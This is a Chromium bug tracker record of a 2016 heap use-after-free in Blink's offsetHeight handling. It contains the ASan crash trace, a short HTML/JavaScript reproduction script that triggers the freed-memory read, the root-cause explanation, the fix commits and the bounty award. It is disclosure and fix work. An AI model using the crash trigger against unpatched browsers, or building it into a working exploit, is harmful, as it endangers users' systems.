# Security: heap-use-after-free in blink::LayoutBox::pixelSnappedOffsetHeight

| Field | Value |
|-------|-------|
| **Issue ID** | [40084768](https://issues.chromium.org/issues/40084768) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>HTML>Modules, Blink>Layout |
| **Reporter** | cl...@gmail.com |
| **Assignee** | ko...@chromium.org |
| **Created** | 2016-07-05 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

The test case crashes the latest ASAN build of chrome as follows:

=================================================================  

==19590==ERROR: AddressSanitizer: heap-use-after-free on address 0x611000037400 at pc 0x000008886317 bp 0x7ffdade71e20 sp 0x7ffdade71e18  

READ of size 8 at 0x611000037400 thread T0 (content\_shell)  

#0 0x8886316 in blink::LayoutBox::pixelSnappedOffsetHeight(blink::Element const\*) const third\_party/WebKit/Source/core/layout/LayoutBox.cpp:468:28  

#1 0x6db988b in blink::HTMLElement::offsetHeightForBinding() third\_party/WebKit/Source/core/html/HTMLElement.cpp:1083:73  

#2 0x98da18f in offsetHeightAttributeGetter /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLElement.cpp:493:37  

#3 0x98da18f in blink::HTMLElementV8Internal::offsetHeightAttributeGetterCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLElement.cpp:498  

#4 0x3f5b911 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/api-arguments.cc:19:3  

#5 0x2c724f5 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::(anonymous namespace)::BuiltinArguments) v8/src/builtins.cc:5490:36  

#6 0x2c71281 in v8::internal::Builtins::InvokeApiFunction(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/builtins.cc:5671:14  

#7 0x3739506 in v8::internal::Object::GetPropertyWithAccessor(v8::internal::LookupIterator\*) v8/src/objects.cc:1174:12  

#8 0x3736aaa in v8::internal::Object::GetProperty(v8::internal::LookupIterator\*) v8/src/objects.cc:830:16  

#9 0x3595dcd in v8::internal::LoadIC::Load(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);)) v8/src/ic/ic.cc:631:5  

#10 0x35b6d68 in \_\_RT\_impl\_Runtime\_LoadIC\_Miss v8/src/ic/ic.cc:2279:5  

#11 0x35b6d68 in v8::internal::Runtime\_LoadIC\_Miss(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/ic/ic.cc:2260  

#12 0x7f6978a063a6 (<unknown module>)  

#13 0x7f6978a6b499 (<unknown module>)  

#14 0x7f6978a442e2 (<unknown module>)  

#15 0x7f6978a25e0e (<unknown module>)  

#16 0x333fc72 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:98:13  

#17 0x333f64c in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:155:10  

#18 0x2bca444 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) v8/src/api.cc:4563:7  

#19 0x91c04ab in blink::V8ScriptRunner::callFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:510:28  

#20 0x90cdfc2 in blink::ScheduledAction::execute(blink::LocalFrame\*) third\_party/WebKit/Source/bindings/core/v8/ScheduledAction.cpp:119:9  

#21 0x85b6360 in blink::DOMTimer::fired() third\_party/WebKit/Source/core/frame/DOMTimer.cpp:135:13  

#22 0xf0a815d in blink::TimerBase::runInternal() third\_party/WebKit/Source/platform/Timer.cpp:136:5  

#23 0xf0a8717 in blink::TimerBase::CancellableTimerTask::run() third\_party/WebKit/Source/platform/Timer.h:113:26  

#24 0x100ade85 in Invoke<std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > base/bind\_internal.h:90:12  

#25 0x100ade85 in MakeItSo<void (\*const &)(std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >), std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > base/bind\_internal.h:204  

#26 0x100ade85 in RunImpl<void (\*const &)(std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >), const std::\_\_1::tuple<base::internal::PassedWrapper<std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > > &, 0> base/bind\_internal.h:267  

#27 0x100ade85 in base::internal::Invoker<base::internal::BindState<void (\*)(std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >), base::internal::PassedWrapper<std::\_\_1::unique\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:245  

#28 0x830651 in Run base/callback.h:389:12  

#29 0x830651 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51  

#30 0x100c938c in scheduler::TaskQueueManager::ProcessTaskFromWorkQueue(scheduler::internal::WorkQueue\*, scheduler::internal::TaskQueueImpl::Task\*) components/scheduler/base/task\_queue\_manager.cc:291:19  

#31 0x100c5103 in scheduler::TaskQueueManager::DoWork(base::TimeTicks, bool) components/scheduler/base/task\_queue\_manager.cc:203:13  

#32 0x100cb7b7 in Invoke<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);), const base::TimeTicks &, const bool &> base/bind\_internal.h:137:12  

#33 0x100cb7b7 in MakeItSo<void (scheduler::TaskQueueManager::\*const &)(base::TimeTicks, bool), base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);), const base::TimeTicks &, const bool &> base/bind\_internal.h:224  

#34 0x100cb7b7 in RunImpl<void (scheduler::TaskQueueManager::\*const &)(base::TimeTicks, bool), const std::\_\_1::tuple<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);), base::TimeTicks, bool> &, 0, 1, 2> base/bind\_internal.h:267  

#35 0x100cb7b7 in base::internal::Invoker<base::internal::BindState<void (scheduler::TaskQueueManager::\*)(base::TimeTicks, bool), base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);), base::TimeTicks, bool>, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:245  

#36 0x830651 in Run base/callback.h:389:12  

#37 0x830651 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51  

#38 0x6e4415 in base::MessageLoop::RunTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:493:19  

#39 0x6e520f in base::MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:502:5  

#40 0x6e6e42 in base::MessageLoop::DoDelayedWork(base::TimeTicks\*) base/message\_loop/message\_loop.cc:662:10  

#41 0x6f0721 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:27  

#42 0x73a8a9 in base::RunLoop::Run() base/run\_loop.cc:35:10  

#43 0x6e19d8 in base::MessageLoop::Run() base/message\_loop/message\_loop.cc:295:12  

#44 0xba3a20c in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:197:37  

#45 0x6487f7 in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:343:14  

#46 0x64cf65 in content::ContentMainRunnerImpl::Run() content/app/content\_main\_runner.cc:785:12  

#47 0x64758d in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:20:28  

#48 0x50d212 in main content/shell/app/shell\_main.cc:48:10  

#49 0x7f6b2b4c182f in \_\_libc\_start\_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291

0x611000037400 is located 0 bytes inside of 200-byte region [0x611000037400,0x6110000374c8)  

freed by thread T0 (content\_shell) here:  

#0 0x4dfc6b in \_\_interceptor\_free (/home/nils/MonkeyChrome/OpRealEstate/asan-linux-release-403751/content\_shell+0x4dfc6b)  

#1 0x67b55bb in blink::Node::detach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/Node.cpp:946:25  

#2 0x65acfde in blink::ContainerNode::detach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:772:11  

#3 0x66e2207 in blink::Element::detach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/Element.cpp:1603:20  

#4 0x67b51b7 in blink::Node::reattach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/Node.cpp:923:9  

#5 0x66e5f4b in blink::Element::recalcOwnStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Element.cpp:1775:9  

#6 0x66e4ab3 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1715:22  

#7 0x65b5085 in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1215:26  

#8 0x66e50c5 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1731:13  

#9 0x6628a48 in blink::Document::updateStyle() third\_party/WebKit/Source/core/dom/Document.cpp:1790:30  

#10 0x6617591 in blink::Document::updateStyleAndLayoutTree() third\_party/WebKit/Source/core/dom/Document.cpp:1725:5  

#11 0x662bda3 in blink::Document::updateStyleAndLayoutTreeIgnorePendingStylesheets() third\_party/WebKit/Source/core/dom/Document.cpp:1968:5  

#12 0x662a5d4 in updateStyleAndLayoutIgnorePendingStylesheets third\_party/WebKit/Source/core/dom/Document.cpp:1973:5  

#13 0x662a5d4 in blink::Document::updateStyleAndLayoutIgnorePendingStylesheetsForNode(blink::Node\*) third\_party/WebKit/Source/core/dom/Document.cpp:1862  

#14 0x6db97b9 in unclosedOffsetParent third\_party/WebKit/Source/core/html/HTMLElement.cpp:1089:16  

#15 0x6db97b9 in blink::HTMLElement::offsetHeightForBinding() third\_party/WebKit/Source/core/html/HTMLElement.cpp:1083  

#16 0x98da18f in offsetHeightAttributeGetter /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLElement.cpp:493:37  

#17 0x98da18f in blink::HTMLElementV8Internal::offsetHeightAttributeGetterCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLElement.cpp:498  

#18 0x3f5b911 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/api-arguments.cc:19:3  

#19 0x2c724f5 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::(anonymous namespace)::BuiltinArguments) v8/src/builtins.cc:5490:36  

#20 0x2c71281 in v8::internal::Builtins::InvokeApiFunction(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/builtins.cc:5671:14  

#21 0x3739506 in v8::internal::Object::GetPropertyWithAccessor(v8::internal::LookupIterator\*) v8/src/objects.cc:1174:12  

#22 0x3736aaa in v8::internal::Object::GetProperty(v8::internal::LookupIterator\*) v8/src/objects.cc:830:16  

#23 0x3595dcd in v8::internal::LoadIC::Load(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);)) v8/src/ic/ic.cc:631:5  

#24 0x35b6d68 in \_\_RT\_impl\_Runtime\_LoadIC\_Miss v8/src/ic/ic.cc:2279:5  

#25 0x35b6d68 in v8::internal::Runtime\_LoadIC\_Miss(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/ic/ic.cc:2260  

#26 0x7f6978a063a6 (<unknown module>)  

#27 0x7f6978a6b499 (<unknown module>)  

#28 0x7f6978a442e2 (<unknown module>)  

#29 0x7f6978a25e0e (<unknown module>)  

#30 0x333fc72 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:98:13  

#31 0x333f64c in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:155:10  

#32 0x2bca444 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) v8/src/api.cc:4563:7  

#33 0x91c04ab in blink::V8ScriptRunner::callFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:510:28

previously allocated by thread T0 (content\_shell) here:  

#0 0x4dffbc in \_\_interceptor\_malloc (/home/nils/MonkeyChrome/OpRealEstate/asan-linux-release-403751/content\_shell+0x4dffbc)  

#1 0x8a2b62a in partitionAlloc third\_party/WebKit/Source/wtf/allocator/PartitionAlloc.h:660:20  

#2 0x8a2b62a in blink::LayoutObject::operator new(unsigned long) third\_party/WebKit/Source/core/layout/LayoutObject.cpp:150  

#3 0xf9d5dfd in blink::HTMLFrameElement::createLayoutObject(blink::ComputedStyle const&) third\_party/WebKit/Source/core/html/HTMLFrameElement.cpp:52:12  

#4 0x6760a20 in blink::LayoutTreeBuilderForElement::createLayoutObject() third\_party/WebKit/Source/core/dom/LayoutTreeBuilder.cpp:119:45  

#5 0x66e02ae in createLayoutObjectIfNeeded third\_party/WebKit/Source/core/dom/LayoutTreeBuilder.h:76:13  

#6 0x66e02ae in blink::Element::attach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/Element.cpp:1540  

#7 0xf9dae69 in blink::HTMLFrameElementBase::attach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/html/HTMLFrameElementBase.cpp:174:28  

#8 0xf9d5eb8 in blink::HTMLFrameElement::attach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/html/HTMLFrameElement.cpp:62:27  

#9 0x67b51ef in blink::Node::reattach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/Node.cpp:924:5  

#10 0x66e5c87 in blink::Element::recalcOwnStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Element.cpp:1775:9  

#11 0x66e4ab3 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1715:22  

#12 0x65b5085 in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1215:26  

#13 0x66e50c5 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1731:13  

#14 0x6628a48 in blink::Document::updateStyle() third\_party/WebKit/Source/core/dom/Document.cpp:1790:30  

#15 0x6617591 in blink::Document::updateStyleAndLayoutTree() third\_party/WebKit/Source/core/dom/Document.cpp:1725:5  

#16 0x662bda3 in blink::Document::updateStyleAndLayoutTreeIgnorePendingStylesheets() third\_party/WebKit/Source/core/dom/Document.cpp:1968:5  

#17 0x662a5d4 in updateStyleAndLayoutIgnorePendingStylesheets third\_party/WebKit/Source/core/dom/Document.cpp:1973:5  

#18 0x662a5d4 in blink::Document::updateStyleAndLayoutIgnorePendingStylesheetsForNode(blink::Node\*) third\_party/WebKit/Source/core/dom/Document.cpp:1862  

#19 0x6db973e in blink::HTMLElement::offsetHeightForBinding() third\_party/WebKit/Source/core/html/HTMLElement.cpp:1081:16  

#20 0x98da18f in offsetHeightAttributeGetter /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLElement.cpp:493:37  

#21 0x98da18f in blink::HTMLElementV8Internal::offsetHeightAttributeGetterCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLElement.cpp:498  

#22 0x3f5b911 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/api-arguments.cc:19:3  

#23 0x2c724f5 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::(anonymous namespace)::BuiltinArguments) v8/src/builtins.cc:5490:36  

#24 0x2c71281 in v8::internal::Builtins::InvokeApiFunction(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/builtins.cc:5671:14  

#25 0x3739506 in v8::internal::Object::GetPropertyWithAccessor(v8::internal::LookupIterator\*) v8/src/objects.cc:1174:12  

#26 0x3736aaa in v8::internal::Object::GetProperty(v8::internal::LookupIterator\*) v8/src/objects.cc:830:16  

#27 0x3595dcd in v8::internal::LoadIC::Load(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);)) v8/src/ic/ic.cc:631:5  

#28 0x35b6d68 in \_\_RT\_impl\_Runtime\_LoadIC\_Miss v8/src/ic/ic.cc:2279:5  

#29 0x35b6d68 in v8::internal::Runtime\_LoadIC\_Miss(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/ic/ic.cc:2260  

#30 0x7f6978a063a6 (<unknown module>)  

#31 0x7f6978a6b499 (<unknown module>)  

#32 0x7f6978a442e2 (<unknown module>)  

#33 0x7f6978a25e0e (<unknown module>)  

#34 0x333fc72 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:98:13

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/WebKit/Source/core/layout/LayoutBox.cpp:468:28 in blink::LayoutBox::pixelSnappedOffsetHeight(blink::Element const\*) const  

Shadow bytes around the buggy address:  

0x0c227fffee30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c227fffee40: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa  

0x0c227fffee50: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  

0x0c227fffee60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c227fffee70: fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

=>0x0c227fffee80:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c227fffee90: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa  

0x0c227fffeea0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  

0x0c227fffeeb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c227fffeec0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa  

0x0c227fffeed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

==19590==ABORTING

**VERSION**  

Chrome Version: asan-linux-release-403751  

Operating System: Linux

**REPRODUCTION CASE**

<script>
function start() {
o1=document.documentElement;
o94=document.createElement('link');
o94.setAttribute('rel','import');
o141=document.documentElement.querySelector('\\*:not([id])');
o144=document.createElement('th');
o144.appendChild(o94);
o162=document.createElement('style');
window.top.setTimeout(f1, 4);
}
function f1() {
o308=document.createElement('style');
o309=document.createTextNode('@import url(&m');
o308.appendChild(o309);
o162.appendChild(o308);
o322=document.createElement('frame');
o141.appendChild(o144);
document.documentElement.appendChild(o162);
o1.appendChild(o322);
o322.offsetHeight;
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Timeline

### ca...@chromium.org (2016-07-06)

[Empty comment from Monorail migration]

[Monorail components: Blink>Layout>Flexbox]

### ko...@chromium.org (2016-07-06)

Probably mine, will take a look.

### aa...@google.com (2016-07-06)

Calamity, please rate security bugs with caution. This heap uaf is high. Also, please don't just put security-impact head on everything. Upload repro on clusterfuzz for analysis.

### ko...@chromium.org (2016-07-06)

Fix work in progress: https://codereview.chromium.org/2126713003

[Monorail components: -Blink>Layout>Flexbox Blink>HTML Blink>Layout]

### ko...@chromium.org (2016-07-07)

The problem was here:

int HTMLElement::offsetHeightForBinding()
{
    document().updateStyleAndLayoutIgnorePendingStylesheetsForNode(this);
    if (LayoutBoxModelObject* layoutObject = layoutBoxModelObject())  // (*1)
        return adjustLayoutUnitForAbsoluteZoom(LayoutUnit(layoutObject->pixelSnappedOffsetHeight(unclosedOffsetParent())), layoutObject->styleRef()).round(); // (*2)
    return 0;
}

On the (*1) line, layoutObject (LayoutBoxModelObject) is obtained, but on the
next line (*2), for passing the first parameter for pixelSnappedOffsetHeight(),
"unclosedOffsetParent()" is called, which can cause style recalculation and
recreation of layout objects.

As layout objects are still managed by reference counting (compared to those managed
by Oilpan GC heap), once the re-layout happens during the call of
unclosedOffsetParent(), the |layoutObject| gets freed, and thus the following
calls of layoutObject->styleRef() and layoutObject->pixelSnappedOffsetHeight()
can cause use-after-free.

The fix is to call unclosedOffsetParent() before getting the layoutObject.
This applies all offset* variants (offsetHeight, offsetWidth, offsetTop, offsetLeft).


### ko...@chromium.org (2016-07-07)

[Empty comment from Monorail migration]

### ko...@chromium.org (2016-07-07)

This was introduced by http://crrev.com/402757 which was done on Jun 29.
As this affects M53, I will request merge to M53 after the change landed
to ToT (M54).

### bu...@chromium.org (2016-07-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/5c480f3117fe314b8cace4f33b84020e9e3424e2

commit 5c480f3117fe314b8cace4f33b84020e9e3424e2
Author: kochi <kochi@chromium.org>
Date: Thu Jul 07 05:07:11 2016

Fix layout object lifecycle in HTMLElement.offset*

In HTMLElement.offset{Left,Top,Width,Height}, it calls offsetParent,
which may cause style recalculation and layout object will be recreated.

BUG=625903

Review-Url: https://codereview.chromium.org/2126713003
Cr-Commit-Position: refs/heads/master@{#404081}

[add] https://crrev.com/5c480f3117fe314b8cace4f33b84020e9e3424e2/third_party/WebKit/LayoutTests/shadow-dom/crashes/offsetParent-layoutObject-lifecycle.html
[modify] https://crrev.com/5c480f3117fe314b8cace4f33b84020e9e3424e2/third_party/WebKit/Source/core/html/HTMLElement.cpp


### ko...@chromium.org (2016-07-07)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-07)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2016-07-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-07)

impact head based on 18d455ee833f6a30dcbe2755380861eb75cd9f6f being initial in 53.0.2784.0

### sh...@chromium.org (2016-07-08)

[Empty comment from Monorail migration]

### ko...@chromium.org (2016-07-12)

Thanks sheriffbot! :)

### go...@chromium.org (2016-07-14)

Before we approve merge to M53, Could you please confirm whether this change is baked/verified in Canary and safe to merge?

### ko...@chromium.org (2016-07-14)

It's almost one week for canary, and from crash reports I don't find any.
The code change is small and safe to merge.

### go...@chromium.org (2016-07-14)

Thank you kochi@.  Approving merge to M53 branch 2785 based on https://crbug.com/chromium/625903#c16. Please merge asap.

### bu...@chromium.org (2016-07-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/981c561ca2d2f805cbfe7c16b6369edbf6219846

commit 981c561ca2d2f805cbfe7c16b6369edbf6219846
Author: Takayoshi Kochi <kochi@chromium.org>
Date: Thu Jul 14 06:48:42 2016

Fix layout object lifecycle in HTMLElement.offset*

In HTMLElement.offset{Left,Top,Width,Height}, it calls offsetParent,
which may cause style recalculation and layout object will be recreated.

BUG=625903

Review-Url: https://codereview.chromium.org/2126713003
Cr-Commit-Position: refs/heads/master@{#404081}
(cherry picked from commit 5c480f3117fe314b8cace4f33b84020e9e3424e2)

Review URL: https://codereview.chromium.org/2148173002 .

Cr-Commit-Position: refs/branch-heads/2785@{#110}
Cr-Branched-From: 68623971be0cfc492a2cb0427d7f478e7b214c24-refs/heads/master@{#403382}

[add] https://crrev.com/981c561ca2d2f805cbfe7c16b6369edbf6219846/third_party/WebKit/LayoutTests/shadow-dom/crashes/offsetParent-layoutObject-lifecycle.html
[modify] https://crrev.com/981c561ca2d2f805cbfe7c16b6369edbf6219846/third_party/WebKit/Source/core/html/HTMLElement.cpp


### aw...@chromium.org (2016-07-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-13)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

And $2,000 for this one!

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### do...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

[Monorail components: -Blink>HTML Blink>HTML>Modules]

### is...@google.com (2016-10-16)

This issue was migrated from crbug.com/chromium/625903?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>HTML>Modules, Blink>Layout]
[Monorail mergedwith: crbug.com/chromium/626185]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084768)*
